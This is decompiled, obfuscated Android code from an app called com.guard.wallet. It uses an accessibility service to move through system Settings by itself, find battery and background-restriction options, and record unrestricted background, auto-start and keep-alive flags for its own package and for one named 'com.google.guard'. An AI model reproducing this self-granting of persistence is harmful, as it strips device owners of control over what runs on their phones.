package o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public final class g extends c {
   public static final int v = 0;
   public final AtomicReference r = new AtomicReference<>(r.e.b);
   public final AtomicBoolean s = new AtomicBoolean(false);
   public final AtomicBoolean t = new AtomicBoolean(false);
   public final AtomicBoolean u = new AtomicBoolean(false);

   public g() {
      super(k0(), "com.android.settings");

      try {
         ScheduledExecutorService var2 = super.p;
         f var1 = new f(this, 2);
         var2.schedule(var1, 30L, TimeUnit.SECONDS);
      } catch (Exception var3) {
         a1.q.s("o.g", var3);
      }
   }

   public static CombineFilter b0() {
      String var1 = com.guard.wallet.utils.f.b("COMMON_ALLOW_BACKGROUND_USAGE_TEXT");
      if (!a1.q.B(var1)) {
         CombineFilter var0 = new CombineFilter();
         StringCondition var2 = a.a.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text", var1);
         var0.getStringConditions().add(var2);
         return var0;
      } else {
         return null;
      }
   }

   public static CombineFilter c0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_BATTERY_TEXT"))) {
         CombineFilter var1 = new CombineFilter();
         StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         var0.setContains(com.guard.wallet.utils.f.b("COMMON_SETTINGS_BATTERY_TEXT"));
         var1.getStringConditions().add(var0);
         return var1;
      } else {
         return null;
      }
   }

   public static ListenWindow d0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow e0(String var0) {
      ListenWindow var1 = new ListenWindow("com.android.settings", "com.android.settings.applications.InstalledAppDetailsTop");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(o.c.H(var0));
      return var1;
   }

   public static CombineFilter f0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_POWER_TEXT"))) {
         CombineFilter var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         var1.setContains(com.guard.wallet.utils.f.b("COMMON_SETTINGS_POWER_TEXT"));
         var0.getStringConditions().add(var1);
         return var0;
      } else {
         return null;
      }
   }

   public static CombineFilter g0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_USE_POWER_TEXT"))) {
         CombineFilter var0 = new CombineFilter();
         StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
         var1.setContains(com.guard.wallet.utils.f.b("COMMON_SETTINGS_USE_POWER_TEXT"));
         var0.getStringConditions().add(var1);
         return var0;
      } else {
         return null;
      }
   }

   public static ListenWindow j0(String var0) {
      ListenWindow var1 = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(o.c.H(var0));
      return var1;
   }

   public static LinkedList k0() {
      LinkedList var0 = new LinkedList();
      var0.add(o.c.J());
      var0.add(e0(com.guard.wallet.utils.g.x0()));
      var0.add(e0(com.guard.wallet.utils.g.e()));
      var0.add(m0(com.guard.wallet.utils.g.x0()));
      var0.add(m0(com.guard.wallet.utils.g.e()));
      var0.add(j0(com.guard.wallet.utils.g.x0()));
      var0.add(j0(com.guard.wallet.utils.g.e()));
      var0.add(d0());
      return var0;
   }

   public static ListenWindow m0(String var0) {
      ListenWindow var1 = new ListenWindow("com.android.settings", "com.android.settings.spa.SpaActivity");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(o.c.H(var0));
      return var1;
   }

   public static CombineFiltersWithOr o0() {
      CombineFiltersWithOr var3 = new CombineFiltersWithOr();
      var3.setFilters(new LinkedList<>());
      boolean var0 = a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_UNRESTRICTED_TEXT"));
      Object var2 = null;
      CombineFilter var1;
      if (!var0) {
         var1 = new CombineFilter();
         StringCondition var4 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("COMMON_SETTINGS_UNRESTRICTED_TEXT", var4, var1, var4);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      if (!a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_NO_RESTRICTED_TEXT"))) {
         var1 = new CombineFilter();
         StringCondition var8 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("COMMON_SETTINGS_NO_RESTRICTED_TEXT", var8, var1, var8);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var1 = (CombineFilter)var2;
      if (!a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"))) {
         var1 = new CombineFilter();
         var2 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT", (StringCondition)var2, var1, (StringCondition)var2);
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      return var3;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void Z() {
      ReentrantLock var1 = super.o;
      if (var1.tryLock()) {
         label59: {
            Exception var10000;
            label63: {
               try {
                  if (this.T()) {
                     break label59;
                  }

                  Log.d("o.g", "准备结束本地保活自动化引擎");
                  this.X();
                  com.guard.wallet.helper.g.h(100);
                  if (MyAccessibilityService.P() != null) {
                     MyAccessibilityService.P().x();
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var10001 = false;
                  break label63;
               }

               AtomicReference var2 = this.r;

               try {
                  if (Objects.equals(var2.get(), r.e.c)) {
                     this.n0(MainApplication.getAppContext().getPackageName());
                  }
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var9 = false;
                  break label63;
               }

               try {
                  if (Objects.equals(var2.get(), r.e.d)) {
                     this.n0("com.google.guard");
                  }
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var10 = false;
                  break label63;
               }

               try {
                  super.p.shutdownNow();
                  com.guard.wallet.thread.l.a(super.c);
                  super.n.clear();
                  if (a1.q.M()) {
                     com.guard.wallet.utils.g.T0(5);
                  }
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var11 = false;
                  break label63;
               }

               try {
                  com.guard.wallet.helper.g.c();
                  Log.d("o.g", "已结束本地保活自动化引擎");
                  o.c.W();
                  this.d();
                  break label59;
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var12 = false;
               }
            }

            Exception var8 = var10000;
            a1.q.s("o.g", var8);
         }

         var1.unlock();
      }
   }

   public final boolean h0() {
      try {
         if (this.q(Collections.singletonList(d0()))) {
            Log.d("o.g", "已进入App耗电管理窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.g", var2);
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean i0() {
      Exception var10000;
      label37: {
         String var1;
         label32: {
            try {
               if (Objects.equals(this.r.get(), r.e.c)) {
                  var1 = com.guard.wallet.utils.g.x0();
                  break label32;
               }
            } catch (Exception var5) {
               var10000 = var5;
               boolean var10001 = false;
               break label37;
            }

            try {
               var1 = com.guard.wallet.utils.g.e();
            } catch (Exception var4) {
               var10000 = var4;
               boolean var7 = false;
               break label37;
            }
         }

         try {
            LinkedList var2 = new LinkedList();
            var2.add(e0(var1));
            var2.add(m0(var1));
            var2.add(j0(var1));
            if (this.q(var2)) {
               Log.d("o.g", "已进入App详情窗口");
               return true;
            }

            return false;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var8 = false;
         }
      }

      Exception var6 = var10000;
      a1.q.s("o.g", var6);
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final UiObject l0(UiObject var1) {
      UiObject var9 = null;
      Object var5 = null;
      Object var2 = null;
      UiObject var3 = null;

      UiObject var59;
      UiObject var63;
      label336: {
         label335: {
            Exception var4;
            label340: {
               CombineFilter var10;
               CombineFilter var11;
               CombineFilter var12;
               AtomicInteger var13;
               label333: {
                  Exception var10000;
                  label341: {
                     try {
                        var1.refresh();
                        Log.d("o.g", "开始滚动电池电量管理栏目");
                        var10 = c0();
                        var12 = f0();
                        var11 = g0();
                        var13 = new AtomicInteger(0);
                     } catch (Exception var44) {
                        var10000 = var44;
                        boolean var10001 = false;
                        break label341;
                     }

                     if (var10 == null && var12 == null && var11 == null) {
                        var59 = null;
                        var63 = null;
                        var9 = (UiObject)var2;
                        break label336;
                     }

                     if (var10 == null) {
                        var2 = null;
                        break label333;
                     }

                     try {
                        var2 = var1.findOneByCombine(var10);
                        break label333;
                     } catch (Exception var43) {
                        var10000 = var43;
                        boolean var69 = false;
                     }
                  }

                  var4 = var10000;
                  var2 = null;
                  var3 = null;
                  var1 = (UiObject)var5;
                  break label340;
               }

               UiObject var6;
               label321: {
                  label342: {
                     if (var12 != null) {
                        try {
                           var63 = var1.findOneByCombine(var12);
                        } catch (Exception var42) {
                           var4 = var42;
                           Object var46 = null;
                           var3 = null;
                           var5 = var2;
                           var2 = var46;
                           break label342;
                        }
                     } else {
                        var63 = null;
                     }

                     Exception var67;
                     label315: {
                        var59 = (UiObject)var2;
                        var6 = var63;
                        if (var11 != null) {
                           var5 = var2;
                           var54 = var63;

                           try {
                              var3 = var1.findOneByCombine(var11);
                           } catch (Exception var35) {
                              var67 = var35;
                              boolean var70 = false;
                              break label315;
                           }

                           var59 = (UiObject)var2;
                           var6 = var63;
                        }

                        while (true) {
                           var9 = var3;
                           var5 = var59;
                           var54 = var6;

                           label345: {
                              try {
                                 if (!var1.canScrollForward()) {
                                    break label345;
                                 }
                              } catch (Exception var41) {
                                 var67 = var41;
                                 boolean var71 = false;
                                 break;
                              }

                              var9 = var3;
                              var5 = var59;
                              var54 = var6;

                              try {
                                 if (var13.incrementAndGet() >= 10) {
                                    break label345;
                                 }
                              } catch (Exception var40) {
                                 var67 = var40;
                                 boolean var72 = false;
                                 break;
                              }

                              var9 = var3;
                              var5 = var59;
                              var54 = var6;

                              try {
                                 Log.d("o.g", "滚动视图可以向下滚动");
                              } catch (Exception var34) {
                                 var67 = var34;
                                 boolean var73 = false;
                                 break;
                              }

                              if (var59 != null) {
                                 var9 = var3;
                                 var5 = var59;
                                 var54 = var6;

                                 try {
                                    if (var59.visibleToUser()) {
                                       break label345;
                                    }
                                 } catch (Exception var39) {
                                    var67 = var39;
                                    boolean var74 = false;
                                    break;
                                 }
                              }

                              if (var6 != null) {
                                 var9 = var3;
                                 var5 = var59;
                                 var54 = var6;

                                 try {
                                    if (var6.visibleToUser()) {
                                       break label345;
                                    }
                                 } catch (Exception var38) {
                                    var67 = var38;
                                    boolean var75 = false;
                                    break;
                                 }
                              }

                              if (var3 != null) {
                                 var9 = var3;
                                 var5 = var59;
                                 var54 = var6;

                                 try {
                                    if (var3.visibleToUser()) {
                                       break label345;
                                    }
                                 } catch (Exception var37) {
                                    var67 = var37;
                                    boolean var76 = false;
                                    break;
                                 }
                              }

                              var9 = var3;
                              var5 = var59;
                              var54 = var6;

                              try {
                                 if (!var1.scrollForwardByGesture()) {
                                    continue;
                                 }
                              } catch (Exception var36) {
                                 var67 = var36;
                                 boolean var77 = false;
                                 break;
                              }

                              var9 = var3;
                              var5 = var59;
                              var54 = var6;

                              try {
                                 Log.d("o.g", "向下滚动查找电池电量管理栏目");
                              } catch (Exception var33) {
                                 var67 = var33;
                                 boolean var78 = false;
                                 break;
                              }

                              var9 = var3;
                              var5 = var59;
                              var54 = var6;

                              try {
                                 com.guard.wallet.utils.g.T0(10);
                              } catch (Exception var32) {
                                 var67 = var32;
                                 boolean var79 = false;
                                 break;
                              }

                              var9 = var3;
                              var5 = var59;
                              var54 = var6;

                              try {
                                 var1.refresh();
                              } catch (Exception var31) {
                                 var67 = var31;
                                 boolean var80 = false;
                                 break;
                              }

                              var2 = var59;
                              if (var10 != null) {
                                 var9 = var3;
                                 var5 = var59;
                                 var54 = var6;

                                 try {
                                    var2 = var1.findOneByCombine(var10);
                                 } catch (Exception var30) {
                                    var67 = var30;
                                    boolean var81 = false;
                                    break;
                                 }
                              }

                              var63 = var6;
                              if (var12 != null) {
                                 var9 = var3;
                                 var5 = var2;
                                 var54 = var6;

                                 try {
                                    var63 = var1.findOneByCombine(var12);
                                 } catch (Exception var29) {
                                    var67 = var29;
                                    boolean var82 = false;
                                    break;
                                 }
                              }

                              var59 = (UiObject)var2;
                              var6 = var63;
                              if (var11 != null) {
                                 var9 = var3;
                                 var5 = var2;
                                 var54 = var63;

                                 try {
                                    var3 = var1.findOneByCombine(var11);
                                 } catch (Exception var28) {
                                    var67 = var28;
                                    boolean var83 = false;
                                    break;
                                 }

                                 var59 = (UiObject)var2;
                                 var6 = var63;
                              }
                              continue;
                           }

                           var9 = var3;
                           var5 = var59;
                           var54 = var6;

                           try {
                              var13.set(0);
                              break label321;
                           } catch (Exception var27) {
                              var67 = var27;
                              boolean var84 = false;
                              break;
                           }
                        }
                     }

                     Exception var47 = var67;
                     var2 = var9;
                     var3 = var54;
                     var4 = var47;
                  }

                  var1 = (UiObject)var5;
                  break label340;
               }

               var2 = var6;
               var9 = var3;
               var3 = var59;

               while (true) {
                  var5 = var9;
                  var6 = var3;
                  UiObject var55 = (UiObject)var2;
                  var9 = var3;
                  var59 = var9;
                  var63 = (UiObject)var2;

                  label243: {
                     Exception var68;
                     label348: {
                        try {
                           if (!var1.canScrollBackward()) {
                              break label336;
                           }
                        } catch (Exception var26) {
                           var68 = var26;
                           boolean var85 = false;
                           break label348;
                        }

                        var6 = var3;
                        var55 = (UiObject)var2;
                        var9 = var3;
                        var59 = var9;
                        var63 = (UiObject)var2;

                        try {
                           if (var13.incrementAndGet() >= 10) {
                              break label336;
                           }
                        } catch (Exception var25) {
                           var68 = var25;
                           boolean var86 = false;
                           break label348;
                        }

                        var6 = var3;
                        var55 = (UiObject)var2;

                        try {
                           Log.d("o.g", "滚动视图可以向上滚动");
                        } catch (Exception var24) {
                           var68 = var24;
                           boolean var87 = false;
                           break label348;
                        }

                        if (var3 != null) {
                           var6 = var3;
                           var55 = (UiObject)var2;
                           var9 = var3;
                           var59 = var9;
                           var63 = (UiObject)var2;

                           try {
                              if (var3.visibleToUser()) {
                                 break label336;
                              }
                           } catch (Exception var23) {
                              var68 = var23;
                              boolean var88 = false;
                              break label348;
                           }
                        }

                        if (var2 != null) {
                           var6 = var3;
                           var55 = (UiObject)var2;
                           var9 = var3;
                           var59 = var9;
                           var63 = (UiObject)var2;

                           try {
                              if (((UiObject)var2).visibleToUser()) {
                                 break label336;
                              }
                           } catch (Exception var22) {
                              var68 = var22;
                              boolean var89 = false;
                              break label348;
                           }
                        }

                        if (var9 != null) {
                           var6 = var3;
                           var55 = (UiObject)var2;

                           try {
                              if (((UiObject)var5).visibleToUser()) {
                                 break label335;
                              }
                           } catch (Exception var21) {
                              var68 = var21;
                              boolean var90 = false;
                              break label348;
                           }
                        }

                        var9 = var9;
                        var6 = var3;
                        var55 = (UiObject)var2;

                        try {
                           if (!var1.scrollBackwardByGesture()) {
                              continue;
                           }
                        } catch (Exception var20) {
                           var68 = var20;
                           boolean var91 = false;
                           break label348;
                        }

                        var6 = var3;
                        var55 = (UiObject)var2;

                        try {
                           Log.d("o.g", "向上滚动查找电池电量管理栏目");
                        } catch (Exception var19) {
                           var68 = var19;
                           boolean var92 = false;
                           break label348;
                        }

                        var6 = var3;
                        var55 = (UiObject)var2;

                        try {
                           com.guard.wallet.utils.g.T0(10);
                        } catch (Exception var18) {
                           var68 = var18;
                           boolean var93 = false;
                           break label348;
                        }

                        var6 = var3;
                        var55 = (UiObject)var2;

                        try {
                           var1.refresh();
                        } catch (Exception var17) {
                           var68 = var17;
                           boolean var94 = false;
                           break label348;
                        }

                        var59 = var3;
                        if (var10 != null) {
                           var6 = var3;
                           var55 = (UiObject)var2;

                           try {
                              var59 = var1.findOneByCombine(var10);
                           } catch (Exception var16) {
                              var68 = var16;
                              boolean var95 = false;
                              break label348;
                           }
                        }

                        var63 = (UiObject)var2;
                        if (var12 != null) {
                           var6 = var59;
                           var55 = (UiObject)var2;

                           try {
                              var63 = var1.findOneByCombine(var12);
                           } catch (Exception var15) {
                              var68 = var15;
                              boolean var96 = false;
                              break label348;
                           }
                        }

                        var3 = var59;
                        var9 = (UiObject)var5;
                        var2 = var63;
                        if (var11 == null) {
                           continue;
                        }

                        var6 = var59;
                        var55 = var63;

                        try {
                           var9 = var1.findOneByCombine(var11);
                           break label243;
                        } catch (Exception var14) {
                           var68 = var14;
                           boolean var97 = false;
                        }
                     }

                     Exception var61 = var68;
                     var1 = var6;
                     var2 = var5;
                     var3 = var55;
                     var4 = var61;
                     break;
                  }

                  var3 = var59;
                  var2 = var63;
               }
            }

            a1.q.s("o.g", var4);
            var63 = var3;
            var59 = (UiObject)var2;
            var9 = var1;
            break label336;
         }

         var9 = var3;
         var59 = var9;
         var63 = (UiObject)var2;
      }

      if (var9 != null) {
         return var9;
      } else {
         return var63 != null ? var63 : var59;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void n0(String var1) {
      Exception var10000;
      label58: {
         PowerControlStateVO var2;
         try {
            var2 = com.guard.wallet.utils.h.k(var1);
            var2.setPackageName(var1);
         } catch (Exception var8) {
            var10000 = var8;
            boolean var10001 = false;
            break label58;
         }

         AtomicBoolean var3 = this.s;

         try {
            if (var3.get()) {
               var2.setAllowAllFullBackground(var3.get());
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var12 = false;
            break label58;
         }

         var3 = this.t;

         try {
            if (var3.get()) {
               var2.setAllowAutoStart(var3.get());
            }
         } catch (Exception var6) {
            var10000 = var6;
            boolean var13 = false;
            break label58;
         }

         var3 = this.u;

         try {
            if (var3.get()) {
               var2.setAllowRelateStart(var3.get());
            }
         } catch (Exception var5) {
            var10000 = var5;
            boolean var14 = false;
            break label58;
         }

         try {
            var2.setRetryCount(var2.getRetryCount() + 1);
            com.guard.wallet.utils.h.L(var2);
            Log.d("o.g", "已保存本地保活策略".concat("|").concat(var1));
            "已保存本地保活策略".concat("|").concat(var1);
            return;
         } catch (Exception var4) {
            var10000 = var4;
            boolean var15 = false;
         }
      }

      Exception var9 = var10000;
      a1.q.s("o.g", var9);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      Exception var10000;
      label52: {
         try {
            if (this.T()) {
               return;
            }
         } catch (Exception var9) {
            var10000 = var9;
            boolean var10001 = false;
            break label52;
         }

         if (var1 != null) {
            try {
               super.u(var1, var2, var3);
            } catch (Exception var8) {
               var10000 = var8;
               boolean var15 = false;
               break label52;
            }
         }

         boolean var4;
         try {
            var4 = this.i0();
         } catch (Exception var7) {
            var10000 = var7;
            boolean var16 = false;
            break label52;
         }

         String var10 = super.c;
         ConcurrentLinkedQueue var14 = super.n;
         if (var4) {
            try {
               var14.remove("keepAliveInAppBattery");
               if (!var14.contains("keepAliveInAppDetail")) {
                  var14.add("keepAliveInAppDetail");
                  f var12 = new f(this, 0);
                  com.guard.wallet.thread.l.c(var12, var10);
               }
            } catch (Exception var6) {
               var10000 = var6;
               boolean var17 = false;
               break label52;
            }
         }

         try {
            if (this.h0()) {
               var14.remove("keepAliveInAppDetail");
               if (!var14.contains("keepAliveInAppBattery")) {
                  var14.add("keepAliveInAppBattery");
                  f var13 = new f(this, 1);
                  com.guard.wallet.thread.l.c(var13, var10);
                  return;
               }
            }

            return;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var18 = false;
         }
      }

      Exception var11 = var10000;
      a1.q.s("o.g", var11);
   }
}
